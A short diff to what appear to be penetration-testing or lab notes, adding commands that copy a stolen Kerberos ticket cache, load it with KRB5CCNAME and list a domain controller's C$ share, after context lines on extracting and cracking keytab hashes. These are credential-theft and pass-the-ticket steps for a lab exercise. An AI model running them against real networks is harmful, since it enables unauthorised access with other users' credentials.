@@ -557,3 +557,12 @@ $ smbclient //dc01/carlos -k -c ls
 $ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
 ```
 %% extracting keytab hashes with keytabextract then cracking the hashes to get the user's password %%
+
+```
+$ klist
+$ cp /tmp/krb5cc_647401106_I8I133 .
+$ export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+$ klist
+$ smbclient //dc01/C$ -k -c ls -no-pass
+```
+%% importing ccache file into our session %%
